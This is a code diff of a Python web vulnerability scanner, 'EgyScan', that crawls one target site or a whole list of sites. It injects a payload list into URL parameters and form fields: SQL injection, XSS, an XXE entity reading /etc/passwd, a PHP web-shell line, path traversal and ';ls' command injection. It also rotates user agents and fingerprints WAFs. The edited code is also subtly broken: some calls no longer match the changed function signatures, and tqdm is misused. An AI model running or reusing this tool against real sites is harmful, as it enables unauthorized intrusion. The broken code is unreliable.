@@ -1,4 +1,3 @@
-import time
 import logging
 import tqdm
 import warnings
@@ -30,13 +29,12 @@ from bs4 import MarkupResemblesLocatorWarning
 init(autoreset=True)
 payloads = [
     "'; SELECT * FROM users; --",
-    "<script>alert('XSS')</script>",
     "<script>alert('AliElTop')</script>",
     "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-    "malicious_payload.php",
+    "webshell.php",
     "admin' OR '1'='1",
     "../../../../etc/passwd%00",
-    "<img src=x onerror=alert('XSS')>",
+    "<img src=x onerror=alert('AliElTop')>",
     "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
     "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
@@ -44,7 +42,7 @@ payloads = [
     ";ls",
     "ls",
     "admin.php",
-    "+9739343777;phone-context=<script>alert(1)</script>",
+    "+9739343777;phone-context=<script>alert(AliElTop)</script>",
     "+91 97xxxx7x7;ext=1;ext=2",
     "+91 97xxxx7x7;phone-context=' OR 1=1; -",
     "+91 97xxxx7x7;phone-context={{4*4}}{{5+5}}",
@@ -907,7 +905,6 @@ def check_xss(url):
             r"url\(",
             r"url\s*\(",
             r"import\s*(",
-            r"XSS",
             r"AliElTop",
         ]
 
@@ -1614,7 +1611,7 @@ def get_url_status(url):
     response = session.head(url)
     return response.status_code
 
-def collect_urls(target_url, num_threads=10):
+def collect_urls(target_url, num_threads=10, session=None):
     parsed_target_url = urlparse(target_url)
     target_domain = parsed_target_url.netloc
 
@@ -1622,6 +1619,7 @@ def collect_urls(target_url, num_threads=10):
     processed_urls = set()
     urls.add(target_url)
 
+    urls_lock = threading.Lock()
     processed_urls_lock = threading.Lock()
 
     def extract_urls_from_html(html, base_url):
@@ -1649,7 +1647,7 @@ def collect_urls(target_url, num_threads=10):
             if current_url.startswith("javascript:"):
                 return set()
 
-            response = get_response(current_url)
+            response = session.get(current_url) if session else requests.get(current_url)
             if response.status_code == 200:
                 extracted_urls = extract_urls_from_html(response.text, current_url)
                 filtered_urls = filter_urls(extracted_urls, target_domain, processed_urls)
@@ -1657,7 +1655,8 @@ def collect_urls(target_url, num_threads=10):
                 with processed_urls_lock:
                     processed_urls.update(filtered_urls)
 
-                urls.update(filtered_urls)
+                with urls_lock:
+                    urls.update(filtered_urls)
         except requests.exceptions.RequestException as e:
             logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
         except Exception as e:
@@ -1714,7 +1713,7 @@ def collect_urls(target_url, num_threads=10):
             worker.join()
 
     return processed_urls
-    
+   
 detected_wafs = []
 
 common_wafs = {
@@ -1759,19 +1758,23 @@ common_wafs = {
     "vidado": ["vidado"],
 }
 
-def scan_and_inject_payloads(url, payloads, vulnerable_urls, threads=10):
-    def make_request(url, data=None, method="GET"):
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-        }
-        with requests.Session() as session:
-            if method.upper() == "POST":
-                response = session.post(url, data=data, headers=headers)
-            else:
-                response = session.get(url, headers=headers)
-        return response
+def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=10):
+    parsed_url = urlparse(url)
+    params = parse_qs(parsed_url.query)
+    vulnerable_urls = set()
+    detected_wafs = []
 
-    def inject_payloads(url, params, payloads, vulnerable_urls):
+    def make_request(url, data=None, method="GET", headers=None):
+        user_agent = random.choice(USER_AGENTS)
+        request_headers = {
+            "User-Agent": user_agent
+        }
+        if headers:
+            request_headers.update(headers)
+        with requests.request(method=method, url=url, data=data, headers=request_headers) as response:
+            return response
+
+    def inject_payloads(url, params, payloads, vulnerable_urls, headers=None):
         base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
 
         for param, param_values in params.items():
@@ -1782,7 +1785,7 @@ def scan_and_inject_payloads(url, payloads, vulnerable_urls, threads=10):
                     injected_url = url.split("?")[0] + "?" + "&".join(
                         f"{key}={quote(value[0])}" for key, value in injected_params.items()
                     )
-                    response = make_request(injected_url)
+                    response = make_request(injected_url, headers=headers)
                     scan_response(response, vulnerable_urls)
 
     def scan_response(response, vulnerable_urls):
@@ -1794,25 +1797,13 @@ def scan_and_inject_payloads(url, payloads, vulnerable_urls, threads=10):
         for waf_name, waf_signatures in common_wafs.items():
             for signature in waf_signatures:
                 if signature.lower() in response.headers.get("Server", "").lower():
-                    if waf_name not in detected_wafs:
-                        detected_wafs.append(waf_name)
+                    detected_wafs.append(waf_name)
 
         print("Response:EgyScan Version 2.0")
         print(f"Status Code: {response.status_code}")
         print(f"Server: {response.headers.get('Server', 'N/A')}")
         print(f"Server Version: {response.headers.get('X-Powered-By', 'N/A')}")
         print("--------------")
-
-    parsed_url = urlparse(url)
-    params = parse_qs(parsed_url.query)
-
-    inject_payloads(url, params, payloads, vulnerable_urls)
-
-    response = make_request(url)
-    scan_response(response, vulnerable_urls)
-
-    soup = BeautifulSoup(response.text, "html.parser")
-    forms = soup.find_all("form")
 
     def scan_form(form):
         form_action = form.get("action")
@@ -1821,7 +1812,21 @@ def scan_and_inject_payloads(url, payloads, vulnerable_urls, threads=10):
                 form_action = urljoin(base_url, form_action)
             form_inputs = form.find_all(["input", "textarea"])
             form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}
-            inject_payloads(form_action, form_data, payloads, vulnerable_urls)
+
+            if tokens:
+                form_data.update(tokens)
+
+            inject_payloads(form_action, form_data, payloads, vulnerable_urls, headers=headers)
+
+    inject_payloads(url, params, payloads, vulnerable_urls, headers=headers)
+
+    response = make_request(url, headers=headers)
+    scan_response(response, vulnerable_urls)
+
+    soup = BeautifulSoup(response.text, "html.parser")
+    forms = soup.find_all("form")
+
+    form_chunks = [forms[i:i + threads] for i in range(0, len(forms), threads)]
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         executor.map(scan_form, forms)
@@ -1830,14 +1835,8 @@ def scan_and_inject_payloads(url, payloads, vulnerable_urls, threads=10):
         print("Detected WAFs:")
         for waf in detected_wafs:
             print(f"- {waf}")
-            
-def scan_response(response, vulnerable_urls):
-    sanitized_url = re.escape(response.url)
-    for check_func, vulnerability_type in vulnerability_checks.items():
-        if check_func(sanitized_url):
-            print_warning(f"{vulnerability_type}{response.url}")
-            vulnerable_urls.add(response.url)
 
+    return vulnerable_urls
 
 
 
@@ -1956,74 +1955,100 @@ def main():
         if user_choice == "1":
             target_url = get_target_url()
 
-            user_choice = input("Do you want to scan inside the user dashboard? (yes/no): ").lower()
-            session = None
+            while True:
+                user_choice = input("Do you want to scan inside the user dashboard? (yes/no): ").lower()
+                if user_choice in ["yes", "no"]:
+                    break
+                else:
+                    print_error("Invalid input. Please enter 'yes' or 'no'.")
+
             if user_choice == "yes":
-                request_file = input("Please enter the path or name of the request file: ")
-                with open(request_file, 'r') as file:
-                    request_content = file.read()
-                headers, body = request_content.split('\n\n', 1)
-                cookies = headers.split('Cookie: ')[1].strip()
-                headers = headers.split('\n')[1:]
-                session = create_session(cookies)
+                while True:
+                    request_file = input("Please enter the path or name of the request file: ")
+                    try:
+                        with open(request_file, 'r') as file:
+                            request_content = file.read()
+                        headers, body = request_content.split('\n\n', 1)
+                        cookies = headers.split('Cookie: ')[1].strip()
+                        headers = headers.split('\n')[1:]
+                        session = create_session(cookies)
+                        break
+                    except FileNotFoundError:
+                        print_error("File not found. Please enter a valid file path.")
+                    except Exception as e:
+                        print_error(f"Error occurred while processing the request file: {e}")
             else:
                 session = create_session()
 
-            print_info("Collecting URLs from the target website...")
-            urls = collect_urls(target_url)
+            try:
+                print_info("Collecting URLs from the target website...")
+                urls = collect_urls(target_url)
 
-            print(f"Found {len(urls)} URLs to scan.")
+                print(f"Found {len(urls)} URLs to scan.")
 
-            print_info("Scanning collected URLs for vulnerabilities...")
-            vulnerable_urls = set()
+                print_info("Scanning collected URLs for vulnerabilities...")
+                vulnerable_urls = set()
 
-            for url in tqdm.tqdm(urls, desc="Scanning Website", unit="URL"):
-                try:
-                    scan_and_inject_payloads(url, payloads, vulnerable_urls)
-                except Exception as e:
-                    print_error(f"Error occurred while scanning URL: {e}")
+                with concurrent.futures.ThreadPoolExecutor() as executor:
+                    futures = [executor.submit(scan_and_inject_payloads, url, payloads, vulnerable_urls) for url in urls]
+                    for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Scanning Website", unit="URL"):
+                        try:
+                            future.result()  
+                        except Exception as e:
+                            print_error(f"Error occurred while scanning URL: {e}")
 
-            print_info("Scanning completed!")
+                print_info("Scanning completed!")
 
-            save_vulnerable_urls(vulnerable_urls)
-            print_info("Vulnerable URLs saved to 'vulnerable_urls.txt'.")
-            break
+                save_vulnerable_urls(vulnerable_urls)
+                print_info("Vulnerable URLs saved to 'vulnerable_urls.txt'.")
+                break
+
+            except Exception as e:
+                print_error(f"Error occurred during the scan process: {e}")
 
         elif user_choice == "2":
-            file_path = input("Enter the path of the txt file containing the list of websites: ")
-            try:
-                with open(file_path, 'r') as file:
-                    websites = file.read().splitlines()
-            except FileNotFoundError:
-                print_error("File not found.")
-                continue
+            while True:
+                file_path = input("Enter the path of the txt file containing the list of websites: ")
+                try:
+                    with open(file_path, 'r') as file:
+                        websites = file.read().splitlines()
+                        break
+                except FileNotFoundError:
+                    print_error("File not found. Please enter a valid file path.")
+                except Exception as e:
+                    print_error(f"Error occurred while processing the file: {e}")
 
             if not websites:
                 print_error("No websites loaded from the file.")
                 continue
 
-            print_info(f"Loaded {len(websites)} websites from the file.")
+            try:
+                print_info(f"Loaded {len(websites)} websites from the file.")
 
-            print_info("Scanning websites from the file...")
-            vulnerable_urls = set()
+                print_info("Scanning websites from the file...")
+                vulnerable_urls = set()
 
-            for website in tqdm.tqdm(websites, desc="Scanning Websites", unit="Website"):
-                try:
-                    urls = collect_urls(website)
-                    for url in urls:
-                        scan_and_inject_payloads(url, payloads, vulnerable_urls)
-                except Exception as e:
-                    print_error(f"Error occurred while scanning website: {e}")
+                with concurrent.futures.ThreadPoolExecutor() as executor:
+                    futures = [executor.submit(collect_urls, website) for website in websites]
+                    for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Scanning Websites", unit="Website"):
+                        try:
+                            urls = future.result()
+                            for url in urls:
+                                executor.submit(scan_and_inject_payloads, url, payloads, vulnerable_urls)
+                        except Exception as e:
+                            print_error(f"Error occurred while scanning website: {e}")
 
-            print_info("Scanning completed!")
+                print_info("Scanning completed!")
 
-            save_vulnerable_urls(vulnerable_urls)
-            print_info("Vulnerable URLs saved to 'vulnerable_urls.txt'.")
-            break
+                save_vulnerable_urls(vulnerable_urls)
+                print_info("Vulnerable URLs saved to 'vulnerable_urls.txt'.")
+                break
+
+            except Exception as e:
+                print_error(f"Error occurred during the scan process: {e}")
 
         else:
             print_error("Invalid choice. Please choose option 1 or 2.")
-            continue
 
 if __name__ == "__main__":
     main()
